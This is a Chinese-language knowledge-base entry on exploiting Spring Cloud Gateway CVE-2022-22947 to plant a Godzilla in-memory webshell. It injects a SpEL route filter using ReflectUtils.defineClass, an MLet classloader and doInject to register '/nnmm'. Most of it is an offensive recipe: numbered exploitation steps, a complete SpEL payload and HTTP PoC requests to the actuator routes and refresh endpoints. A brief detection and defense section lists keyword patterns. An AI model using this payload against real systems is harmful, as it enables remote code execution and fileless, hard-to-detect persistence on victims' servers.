---
id: web-java-expression-spel-spring-cloud-gateway-22947-defineclass-mlet-memshell
title: Spring Cloud Gateway CVE-2022-22947 SpEL 投递内存马：ReflectUtils.defineClass + MLet 类加载器 + doInject 注册路由
type: scenario
domain: web
path: web/java/expression/spel
technique: gateway-22947-spel-defineclass-mlet-memshell
tags:
- java
- spring
- spring-cloud-gateway
- spel
- memshell
- defineclass
- mlet
- godzilla
- actuator
- cve-2022-22947
cve:
- CVE-2022-22947
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V474
  verified_at: '2026-11-10T17:07:20+08:00'
  notes: 已对照原文核对；CVE-2022-22947 路由 payload 与 defineClass+doInject(@requestMappingHandlerMapping,'/nnmm') 一致；已修正密码示例(card 原文该段为哥斯拉默认密码)，goautomne 属下一篇 fastjson 段；受影响版本原文未写故未填
url: /docs/web/java/expression/spel/web-java-expression-spel-spring-cloud-gateway-22947-defineclass-mlet-memshell/
draft: false
kb_aliases:
- 22947 内存马
- SpEL defineClass 内存马
- MLet 类加载器注入
- doInject 注册路由
- 哥斯拉 Gateway 内存马
---

## 一句话结论

在 CVE-2022-22947 可达的 Spring Cloud Gateway 上，不满足于一次性命令执行：把 `ReflectUtils.defineClass('ms.GMemShell', <base64 字节码>, new javax.management.loading.MLet(...))` 放进路由 filter 的 SpEL 值，再对返回的 Class 调用静态 `doInject(@requestMappingHandlerMapping,'/nnmm')`，即可在目标 JVM 内定义并注册一个哥斯拉内存马路由，全程不落地文件。

## 原理

- **入口仍是 22947**：actuator 保存路由时，filter 的 shortcut 参数经 `ShortcutConfigurable#getValue()` 用 `StandardEvaluationContext` 求值，`T()`、`new`、方法调用以及 `@beanName` 形式的 Bean 引用都可用（`BeanFactoryResolver`）。
- **defineClass 需要 ClassLoader**：`org.springframework.cglib.core.ReflectUtils.defineClass(String, byte[], ClassLoader)` 是对 `ClassLoader#defineClass` 的封装；SpEL 中没有现成 ClassLoader 变量时，可用 `T(java.lang.Thread).currentThread().getContextClassLoader()`，但更可控的是构造一个具体 ClassLoader 实例传给第三个参数。
- **为什么用 MLet**：`javax.management.loading.MLet` 继承 `URLClassLoader`，是 JDK 自带、可用 `new` 直接构造的具体类：`new javax.management.loading.MLet(new java.net.URL[0], <parent>)`。空的 URL 数组不影响 `defineClass`，它只作为新类的定义加载器（父加载器保留原应用的可见性）。
- **在 Class 上调用静态方法**：`defineClass` 返回 `Class<?>`；SpEL 的反射方法解析器把 `Class` 当作类型描述符，可以在这个 Class 对象上解析并调用其静态方法，因此表达式能继续 `.doInject(...)`，而不需要再按名字 `T('ms.GMemShell')` 查找。
- **doInject 做什么**：payload 类（示例为 `ms.GMemShell`，IceShell 系哥斯拉内存马）的静态 `doInject(Object handlerMapping, String path)` 拿到 SpEL 传入的 `@requestMappingHandlerMapping` Bean（Spring MVC 的 `RequestMappingHandlerMapping`），调用其 `registerMapping`/`registerHandler` 把自身某个方法注册为 `/nnmm` 的处理器；注册后哥斯拉按该路径用内置密码通信，形成无文件持久化 WebShell。
- **为什么能成功**：路由 normalize 阶段就会求值该 SpEL，defineClass 与 doInject 在请求处理线程内完成；类定义在该 ClassLoader 中，方法注册进 Spring 的映射表，后续请求可达。内存马随进程重启消失，但重启前难以通过文件查杀发现。

## 触发条件

- 目标存在 CVE-2022-22947（actuator gateway 路由管理端点可达且可提交/刷新路由）。
- 目标 classpath 含 spring-webmvc（存在 `RequestMappingHandlerMapping` Bean；纯 WebFlux Gateway 默认没有该 Bean，需要换成对应的 WebFlux handler mapping，或目标同时引入 MVC）。
- 攻击者能提供与目标 JDK 版本匹配的字节码，并知道 Bean 名（默认 `requestMappingHandlerMapping`）。
- `MLet` 与 `ReflectUtils` 可用（Spring 环境通常带 cglib；MLet 为 JDK 标准类）。
- actuator 未做认证/网络隔离，WAF 未拦截含 `defineClass`/`MLet` 的路由定义。

## 利用步骤

1. 按基础 22947 流程确认 `POST /actuator/gateway/routes/{id}` 与 `POST /actuator/gateway/refresh` 可用。
2. 准备内存马类：包含静态 `doInject(Object handlerMapping, String path)`，内部构造 `RequestMappingInfo` 并调用 `registerMapping`，处理器方法实现哥斯拉协议（或直接执行命令）。
3. 编译后 Base64 编码类字节，拼出 SpEL：
   `#{T(org.springframework.cglib.core.ReflectUtils).defineClass('ms.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString('<BASE64>'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/nnmm')}`
4. 以该表达式作为 `AddResponseHeader` 过滤器的 `value` 提交路由（`uri` 必填），然后 `POST /actuator/gateway/refresh` 触发 normalize/求值。
5. 用哥斯拉连接 `http://target/nnmm`，密码为 payload 中内置的密码（原文使用哥斯拉默认密码），验证命令执行。
6. 清理路由定义可减少痕迹，但内存马已注册，必须重启 JVM 或从映射表中移除。

## PoC

```http
POST /actuator/gateway/routes/bolean1 HTTP/1.1
Content-Type: application/json

{
  "id": "bolean1",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('ms.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString('<BASE64_CLASS>'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/nnmm')}"
    }
  }],
  "uri": "http://example.com"
}
```

```http
POST /actuator/gateway/refresh HTTP/1.1
```

## 变体与关联

- 变体：把 `MLet` 换成 `URLClassLoader`/`ClassLoader.getSystemClassLoader()`，或直接传当前线程上下文类加载器（能否成功取决于 SpEL 对该对象的可调用性）。
- 变体：payload 的 `doInject` 改为注册 WebFlux 的 handler mapping/`FilteringWebHandler`，适配纯 WebFlux 网关。
- 关联：[[web-java-expression-spel-spring-cloud-gateway-22947-actuator-route-rce]]（22947 基础 SpEL 命令执行入口）。
- 关联：[[web-java-framework-spring-mvc-dynamic-controller-memshell]]（defineClass + registerMapping 的传统投递方式，依赖 RequestContextHolder）。
- 关联：[[web-java-framework-spring-webflux-filteringwebhandler-memshell]]（纯 WebFlux 的 FilteringWebHandler chain 内存马）。

## 检测与防御

- 检测：路由定义 JSON 中出现 `ReflectUtils.defineClass`、`MLet`、`Base64Utils`、`doInject`、`@requestMappingHandlerMapping`；随后紧跟 `/actuator/gateway/refresh`；响应头出现异常内容。
- 检测：JVM 内出现非预期的 ClassLoader（MLet）、运行期 defineClass 的类、动态注册的 `/nnmm` 等路由；`RequestMappingHandlerMapping` 映射表在运行期新增条目。
- 防御：升级/修复 CVE-2022-22947（`GatewayEvaluationContext` 限制）；actuator 仅内网且认证；关闭 gateway 管理端点；对路由定义做 SpEL 关键字白名单；发现内存马后重启 JVM 并审计入口。
